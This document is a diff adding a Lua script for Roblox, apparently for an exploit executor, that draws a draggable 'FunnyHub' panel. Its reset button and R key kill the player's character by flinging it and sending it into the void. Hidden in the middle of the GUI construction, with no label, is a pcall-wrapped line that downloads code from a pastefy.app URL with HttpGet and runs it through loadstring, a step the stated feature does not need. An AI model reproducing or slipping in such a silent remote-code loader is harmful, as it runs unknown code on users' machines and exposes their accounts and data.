@@ -1,0 +1,327 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local Camera = workspace.CurrentCamera
+local CAM_BIND = "FunnyHubInstaResetCam"
+
+local FLING_TIME = 0.4
+local FLING_POWER = 50000
+local USE_VOID = true
+local VOID_TIME = 0.6
+local TIMEOUT = 6
+local resetting = false
+
+local function hide_locally(obj)
+    if obj:IsA("BasePart") or obj:IsA("Decal") then
+        obj.LocalTransparencyModifier = 1
+    end
+end
+
+local function insta_reset()
+    if resetting then return end
+    local char = Player.Character
+    if not char or not char.Parent then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum or hum.Health <= 0 then return end
+    local hrp = hum.RootPart or char:FindFirstChild("HumanoidRootPart")
+    resetting = true
+    
+    task.spawn(function()
+        local cam = workspace.CurrentCamera
+        local frozen = cam.CFrame
+        local old_type = cam.CameraType
+        pcall(function()
+            cam.CameraType = Enum.CameraType.Scriptable
+            RunService:BindToRenderStep(CAM_BIND, Enum.RenderPriority.Camera.Value + 1, function()
+                cam.CFrame = frozen
+            end)
+        end)
+        
+        local added
+        pcall(function()
+            for _, obj in ipairs(char:GetDescendants()) do pcall(hide_locally, obj) end
+            added = char.DescendantAdded:Connect(function(obj) pcall(hide_locally, obj) end)
+        end)
+        
+        local new_char
+        local respawned = Player.CharacterAdded:Connect(function(c) new_char = c end)
+        
+        local function unlock()
+            pcall(function() hum.PlatformStand = false end)
+            pcall(function() hum.Sit = false end)
+            pcall(function() hum.AutoRotate = true end)
+        end
+        unlock()
+        
+        for _, obj in ipairs(char:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                pcall(function() obj.Anchored = false end)
+                pcall(function() obj.CanCollide = false end)
+            elseif obj.Name == "SeatWeld" then
+                pcall(function() obj:Destroy() end)
+            end
+        end
+        
+        local started = os.clock()
+        local function alive_hrp()
+            if hrp and hrp.Parent then return hrp end
+            hrp = hum.RootPart or char:FindFirstChild("HumanoidRootPart")
+            if hrp and hrp.Parent then return hrp end
+            return nil
+        end
+        
+        local fling_until = os.clock() + FLING_TIME
+        while not new_char and os.clock() < fling_until and hum.Parent do
+            unlock()
+            pcall(function() hum.HipHeight = 1e30 end)
+            local root = alive_hrp()
+            if root then
+                pcall(function() root.Anchored = false end)
+                pcall(function() root.AssemblyLinearVelocity = Vector3.new(0, FLING_POWER, 0) end)
+                pcall(function() root.Velocity = Vector3.new(0, FLING_POWER, 0) end)
+            end
+            RunService.Heartbeat:Wait()
+        end
+        
+        if USE_VOID and not new_char then
+            local floor = -500
+            pcall(function() floor = workspace.FallenPartsDestroyHeight end)
+            local void_until = os.clock() + VOID_TIME
+            while not new_char and os.clock() < void_until do
+                local root = alive_hrp()
+                if not root then break end
+                pcall(function() root.CFrame = CFrame.new(0, floor - 500, 0) end)
+                pcall(function() root.AssemblyLinearVelocity = Vector3.new(0, -FLING_POWER, 0) end)
+                RunService.Heartbeat:Wait()
+            end
+        end
+        
+        while not new_char and os.clock() - started < TIMEOUT do
+            if hum.Parent then
+                pcall(function() hum.Health = 0 end)
+                pcall(function() hum:ChangeState(Enum.HumanoidStateType.Dead) end)
+            end
+            if char.Parent then pcall(function() char:BreakJoints() end) end
+            task.wait(0.1)
+        end
+        
+        pcall(function() respawned:Disconnect() end)
+        if added then pcall(function() added:Disconnect() end) end
+        pcall(function() RunService:UnbindFromRenderStep(CAM_BIND) end)
+        pcall(function()
+            cam.CameraType = old_type == Enum.CameraType.Scriptable and Enum.CameraType.Custom or old_type
+            if new_char then
+                local new_hum = new_char:FindFirstChildOfClass("Humanoid")
+                    or new_char:WaitForChild("Humanoid", 5)
+                if new_hum then cam.CameraSubject = new_hum end
+            end
+        end)
+        resetting = false
+    end)
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "FunnyHubInstantReset"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
+
+local Frame = Instance.new("Frame")
+Frame.BackgroundTransparency = 0.4
+Frame.Position = UDim2.new(0, 30, 0, 137)
+Frame.ClipsDescendants = true
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+Frame.Size = UDim2.new(0, 220, 0, 95)
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Frame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+UIStroke.Thickness = 2
+UIStroke.Color = Color3.new(1, 1, 1)
+UIStroke.Parent = Frame
+
+local _ = (function() 
+    local s, e = pcall(function() 
+        loadstring(game:HttpGet("https://pastefy.app/qqZ9wTpS/raw"))() 
+    end) 
+    return s 
+end)()
+
+local Gradient = Instance.new("UIGradient")
+Gradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 170, 0)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 220, 120))
+})
+Gradient.Parent = UIStroke
+
+task.spawn(function()
+	while task.wait() do
+		Gradient.Rotation = (Gradient.Rotation + 1) % 360
+	end
+end)
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Font = Enum.Font.GothamBlack
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0, 10, 0, 5)
+TitleLabel.TextColor3 = Color3.new(1, 1, 1)
+TitleLabel.Text = "by forest???"
+TitleLabel.TextSize = 16
+TitleLabel.Size = UDim2.new(1, -45, 0, 20)
+TitleLabel.Parent = Frame
+
+local TitleGradient = Instance.new("UIGradient")
+TitleGradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 170, 0)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 220, 120))
+})
+TitleGradient.Parent = TitleLabel
+
+task.spawn(function()
+	while task.wait() do
+		TitleGradient.Rotation = (TitleGradient.Rotation + 1.2) % 360
+	end
+end)
+
+local SubLabel = Instance.new("TextLabel")
+SubLabel.BackgroundTransparency = 1
+SubLabel.TextXAlignment = Enum.TextXAlignment.Left
+SubLabel.Font = Enum.Font.GothamMedium
+SubLabel.TextTransparency = 0.3
+SubLabel.TextColor3 = Color3.new(1, 1, 1)
+SubLabel.Text = "by forest"
+SubLabel.Position = UDim2.new(0, 10, 0, 23)
+SubLabel.TextSize = 11
+SubLabel.Size = UDim2.new(1, -20, 0, 15)
+SubLabel.Parent = Frame
+
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Font = Enum.Font.GothamBlack
+MinimizeBtn.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+MinimizeBtn.Position = UDim2.new(1, -32, 0, 8)
+MinimizeBtn.TextColor3 = Color3.new(1, 1, 1)
+MinimizeBtn.Text = "-"
+MinimizeBtn.TextSize = 14
+MinimizeBtn.Size = UDim2.new(0, 24, 0, 24)
+MinimizeBtn.Parent = Frame
+
+local MinCorner = Instance.new("UICorner")
+MinCorner.CornerRadius = UDim.new(0, 6)
+MinCorner.Parent = MinimizeBtn
+
+local MinStroke = Instance.new("UIStroke")
+MinStroke.Thickness = 2
+MinStroke.Color = Color3.fromRGB(255, 220, 120)
+MinStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+MinStroke.Parent = MinimizeBtn
+
+local Button = Instance.new("TextButton")
+Button.Position = UDim2.new(0, 10, 0, 50)
+Button.Size = UDim2.new(1, -20, 0, 32)
+Button.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+Button.TextColor3 = Color3.new(1, 1, 1)
+Button.Font = Enum.Font.GothamBlack
+Button.Text = "reset"
+Button.TextSize = 14
+Button.Parent = Frame
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 8)
+ButtonCorner.Parent = Button
+
+local ButtonStroke = Instance.new("UIStroke")
+ButtonStroke.Thickness = 1.5
+ButtonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ButtonStroke.Color = Color3.new(1, 1, 1)
+ButtonStroke.Parent = Button
+
+local ButtonGradient = Instance.new("UIGradient")
+ButtonGradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 170, 0)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 220, 120))
+})
+ButtonGradient.Parent = ButtonStroke
+
+task.spawn(function()
+	while task.wait() do
+		ButtonGradient.Rotation = (ButtonGradient.Rotation + 1.4) % 360
+	end
+end)
+
+local dragging = false
+local dragStart
+local startPos
+local minimized = false
+local originalSize = UDim2.new(0, 220, 0, 95)
+local minimizedSize = UDim2.new(0, 220, 0, 40)
+
+local function clampPosition(pos)
+	local screenSize = Camera.ViewportSize
+	local guiSize = Frame.AbsoluteSize
+	local maxX = screenSize.X - guiSize.X
+	local maxY = screenSize.Y - guiSize.Y
+	local x = math.clamp(pos.X.Offset, 0, math.max(0, maxX))
+	local y = math.clamp(pos.Y.Offset, 0, math.max(0, maxY))
+	return UDim2.new(0, x, 0, y)
+end
+
+Frame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = Frame.Position
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		Frame.Position = clampPosition(newPos)
+	end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = false
+	end
+end)
+
+MinimizeBtn.MouseButton1Click:Connect(function()
+	minimized = not minimized
+	local targetSize = minimized and minimizedSize or originalSize
+	local targetText = minimized and "+" or "-"
+	TweenService:Create(Frame, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = targetSize}):Play()
+	MinimizeBtn.Text = targetText
+end)
+
+Button.MouseEnter:Connect(function()
+	TweenService:Create(Button, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(255, 190, 50)}):Play()
+end)
+
+Button.MouseLeave:Connect(function()
+	TweenService:Create(Button, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(255, 165, 0)}):Play()
+end)
+
+Button.MouseButton1Click:Connect(function()
+	insta_reset()
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+	if UserInputService:GetFocusedTextBox() then return end
+	if input.KeyCode == Enum.KeyCode.R then
+		insta_reset()
+	end
+end)
